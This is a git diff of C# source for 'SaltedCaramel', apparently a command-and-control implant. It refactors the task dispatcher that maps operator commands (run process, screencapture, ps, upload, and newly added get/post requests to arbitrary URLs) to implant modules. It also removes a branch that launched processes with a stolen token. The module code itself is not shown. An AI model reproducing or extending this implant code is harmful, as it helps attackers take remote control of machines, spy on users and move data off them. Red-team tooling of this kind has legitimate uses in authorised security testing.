@@ -1,12 +1,5 @@
-﻿using Newtonsoft.Json;
-using Newtonsoft.Json.Linq;
-using SharpSploit.Enumeration;
-using SharpSploit.Execution;
-using SharpSploit.Generic;
-using System;
-using System.Collections.Generic;
+﻿using System;
 using System.Diagnostics;
-using System.IO;
 
 using SaltedCaramel.Tasks;
 
@@ -15,13 +8,13 @@ namespace SaltedCaramel
     /// <summary>
     /// A task to assign to an implant
     /// </summary>
-    internal class SaltedCaramelTask
+    internal class SCTask
     {
         internal string command { get; set; }
         internal string @params { get; set; }
         internal string id { get; set; }
 
-        public SaltedCaramelTask(string command, string @params, string id)
+        public SCTask (string command, string @params, string id)
         {
             this.command = command;
             this.@params = @params;
@@ -32,7 +25,7 @@ namespace SaltedCaramel
         /// Handle a new task.
         /// </summary>
         /// <param name="implant">The CaramelImplant we're handling a task for</param>
-        public void DispatchTask(SaltedCaramelImplant implant)
+        public void DispatchTask(SCImplant implant)
         {
             if (this.command == "cd")
             {
@@ -54,10 +47,20 @@ namespace SaltedCaramel
                 Debug.WriteLine("[-] DispatchTask - Tasked to exit");
                 Exit.Execute(this, implant);
             }
+            else if (this.command == "get")
+            {
+                Debug.WriteLine("[-] DispatchTask - Tasked to get url " + this.@params);
+                Request.Execute(this, implant);
+            }
             else if (this.command == "upload")
             {
                 Debug.WriteLine("[-] DispatchTask - Tasked to get file from server");
                 Upload.Execute(this, implant);
+            }
+            else if (this.command == "post")
+            {
+                Debug.WriteLine("[-] DispatchTask - Tasked to post data to url " + this.@params);
+                Request.Execute(this, implant);
             }
             else if (this.command == "ps")
             {
@@ -82,10 +85,8 @@ namespace SaltedCaramel
             }
             else if (this.command == "run")
             {
-                if (implant.hasAlternateToken() == true)
-                    SaltedCaramelProcess.StartProcessWithToken(Token.stolenHandle, implant, this);
-                else
-                    SaltedCaramelProcess.StartProcess(implant, this);
+                Debug.WriteLine("[-] DispatchTask - Tasked to start process");
+                Proc.Execute(this, implant);
             }
             else if (this.command == "screencapture")
             {
